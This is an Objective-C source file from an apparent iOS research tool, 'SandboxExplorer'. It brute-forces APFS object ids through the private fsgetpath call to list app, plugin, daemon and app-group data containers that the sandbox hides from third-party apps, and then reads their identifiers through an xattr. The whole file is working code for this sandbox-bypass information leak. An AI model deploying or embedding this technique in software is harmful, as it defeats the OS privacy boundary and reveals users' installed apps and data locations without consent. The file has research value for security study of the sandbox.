//
//  WQPathLeak.m
//  SandboxExplorer
//
//  Arbitrary path enumeration with fsgetpath, the technique used by
//  worse_query / bad_query and KAMUI. fsgetpath resolves an APFS object id to
//  a pathname without consulting the sandbox, so brute-forcing the id range
//  reveals the UUID-named data containers that a third-party process may not
//  list directly.
//
//  Copyright (C) 2026 SandboxExplorer contributors.
//  Derived from worse_query by Taj C (forcequitOS), GPL-3.0-or-later.
//

#import "WQKit.h"

#import <dlfcn.h>
#import <errno.h>
#import <fcntl.h>
#import <string.h>
#import <unistd.h>
#import <sys/mount.h>
#import <sys/stat.h>
#import <sys/xattr.h>

// fsgetpath is not declared in the public iOS SDK. Resolve it at runtime with
// a differently-named function pointer: this avoids any conflicting-types
// error if a future SDK happens to expose a prototype, and keeps fsid_t (a
// private typedef) out of our sources entirely.
typedef ssize_t (*WQFsGetPathFn)(char *buf, size_t buflen, void *fsid, uint64_t objid);

static WQFsGetPathFn WQResolveFsGetPath(void)
{
    static WQFsGetPathFn fn;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        fn = (WQFsGetPathFn)dlsym(RTLD_DEFAULT, "fsgetpath");
        if (!fn) {
            void *libSystem = dlopen("/usr/lib/libSystem.B.dylib", RTLD_LAZY | RTLD_LOCAL);
            if (libSystem) fn = (WQFsGetPathFn)dlsym(libSystem, "fsgetpath");
        }
    });
    return fn;
}

static const uint64_t kWQInodeMargin = 100000;

uint64_t WQProbeMaxInode(void)
{
    NSString *dir = NSTemporaryDirectory() ?: WQTmpPath();
    NSString *probe = [dir stringByAppendingPathComponent:
                       [NSString stringWithFormat:@"wq-inode-probe-%@", NSUUID.UUID.UUIDString]];
    int fd = open(probe.fileSystemRepresentation, O_CREAT | O_EXCL | O_WRONLY, 0600);
    if (fd < 0) {
        WQLog(@"inode probe: create failed (%s)", strerror(errno));
        return 500000;
    }
    struct stat st = {0};
    BOOL ok = (fstat(fd, &st) == 0);
    close(fd);
    unlink(probe.fileSystemRepresentation);
    if (!ok || st.st_ino == 0) {
        WQLog(@"inode probe: fstat failed, using fallback bound");
        return 500000;
    }
    uint64_t bound = (uint64_t)st.st_ino + kWQInodeMargin;
    WQLog(@"inode probe: newest id ~%llu, scan bound %llu",
          (unsigned long long)st.st_ino, (unsigned long long)bound);
    return bound;
}

NSArray<NSString *> *WQDefaultContainerParents(void)
{
    NSMutableArray<NSString *> *parents = [@[
        @"/private/var/mobile/Containers/Data/Application",
        @"/private/var/mobile/Containers/Data/PluginKitPlugin",
        @"/private/var/mobile/Containers/Data/InternalDaemon",
        @"/private/var/mobile/Containers/Shared/AppGroup",
    ] mutableCopy];
    if (WQOS27OrLater()) {
        [parents addObject:@"/var/containers/Data/System"];
        [parents addObject:@"/var/containers/Shared/SystemGroup"];
    }
    return parents.copy;
}

NSArray<NSString *> *WQEnumerateChildren(
    NSString *parent,
    uint64_t maxInode,
    void (^progress)(uint64_t done, uint64_t total, NSUInteger found),
    BOOL (^cancelled)(void))
{
    if (parent.length == 0) return nil;
    WQFsGetPathFn fsGetPath = WQResolveFsGetPath();
    if (!fsGetPath) {
        WQLog(@"enumerate: fsgetpath is unavailable on this system");
        return nil;
    }

    NSString *dir = WQNormalize(parent);
    while (dir.length > 1 && [dir hasSuffix:@"/"]) dir = [dir substringToIndex:dir.length - 1];

    // statfs on our own tmp directory gives the fsid of the data volume. Using
    // our own sandbox path avoids a lookup that the sandbox itself could deny.
    struct statfs sfs = {0};
    NSString *probeDir = NSTemporaryDirectory() ?: WQTmpPath();
    if (statfs(probeDir.fileSystemRepresentation, &sfs) != 0) {
        if (statfs(dir.fileSystemRepresentation, &sfs) != 0) {
            WQLog(@"enumerate: statfs failed (%s)", strerror(errno));
            return nil;
        }
    }
    // Keep only the address; never spell the private fsid_t typedef.
    void *fsidPtr = &sfs.f_fsid;

    // A C array declared outside a block cannot be captured by a block
    // ("cannot refer to declaration with an array type inside block"). Keep the
    // prefix on the heap and pass a plain pointer into the dispatch_apply block.
    char *prefix = (char *)calloc(PATH_MAX, 1);
    if (!prefix) return nil;
    if (![dir getFileSystemRepresentation:prefix maxLength:PATH_MAX]) {
        free(prefix);
        return nil;
    }
    size_t prefixLength = strlen(prefix);
    if (prefixLength == 1 && prefix[0] == '/') prefixLength = 0;

    uint64_t lastId = maxInode ?: WQProbeMaxInode();
    if (lastId < 1) {
        free(prefix);
        return @[];
    }
    uint64_t total = lastId;

    const uint64_t chunk = 32768;
    uint64_t chunks = (total + chunk - 1) / chunk;
    __block uint64_t nextChunk = 0;
    __block uint64_t done = 0;
    NSLock *chunkLock = [NSLock new];
    NSLock *resultLock = [NSLock new];
    NSMutableSet<NSString *> *found = [NSMutableSet new];
    NSUInteger workers = (NSUInteger)MAX(2, MIN(8, (int)NSProcessInfo.processInfo.activeProcessorCount));

    WQLog(@"enumerate %@: ids 1..%llu on %lu workers", dir,
          (unsigned long long)lastId, (unsigned long)workers);

    dispatch_apply(workers, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_LOW, 0), ^(size_t worker) {
        (void)worker;
        char buffer[PATH_MAX];
        for (;;) {
            if (cancelled && cancelled()) return;

            uint64_t index;
            [chunkLock lock];
            if (nextChunk >= chunks) { [chunkLock unlock]; return; }
            index = nextChunk++;
            [chunkLock unlock];

            uint64_t first = index * chunk + 1;
            uint64_t last = MIN(first + chunk - 1, lastId);
            NSMutableArray<NSString *> *local = [NSMutableArray array];

            for (uint64_t ino = first; ino <= last; ino++) {
                if ((ino & 255) == 0 && cancelled && cancelled()) return;
                ssize_t n = fsGetPath(buffer, sizeof(buffer), fsidPtr, ino);
                if (n <= 0) continue;
                buffer[sizeof(buffer) - 1] = '\0';
                if (strncmp(buffer, prefix, prefixLength) != 0) continue;
                if (buffer[prefixLength] != '/') continue;
                if (strchr(buffer + prefixLength + 1, '/') != NULL) continue;  // direct children only
                NSString *path = [NSFileManager.defaultManager
                                  stringWithFileSystemRepresentation:buffer
                                  length:strlen(buffer)];
                if (path) [local addObject:path];
            }

            NSUInteger count = 0;
            [resultLock lock];
            [found addObjectsFromArray:local];
            count = found.count;
            done += (last - first + 1);
            uint64_t doneNow = done;
            [resultLock unlock];
            if (progress) progress(doneNow, total, count);
        }
    });

    free(prefix);
    prefix = NULL;

    if (cancelled && cancelled()) {
        WQLog(@"enumerate %@: cancelled after %lu hits", dir, (unsigned long)found.count);
        return nil;
    }
    NSArray<NSString *> *result = [found.allObjects sortedArrayUsingSelector:@selector(compare:)];
    WQLog(@"enumerate %@: %lu direct children", dir, (unsigned long)result.count);
    return result;
}

NSString *WQContainerIdentifier(NSString *path)
{
    if (path.length == 0) return nil;
    // Reading the xattr may itself need an extension for that container.
    WQGrant(path);
    char buffer[512];
    memset(buffer, 0, sizeof(buffer));
    ssize_t length = getxattr(path.fileSystemRepresentation,
                              "com.apple.containermanager.identifier",
                              buffer, sizeof(buffer) - 1, 0, 0);
    if (length <= 0) return nil;
    buffer[MIN((size_t)length, sizeof(buffer) - 1)] = '\0';
    NSString *value = [NSString stringWithUTF8String:buffer];
    return value.length ? value : nil;
}
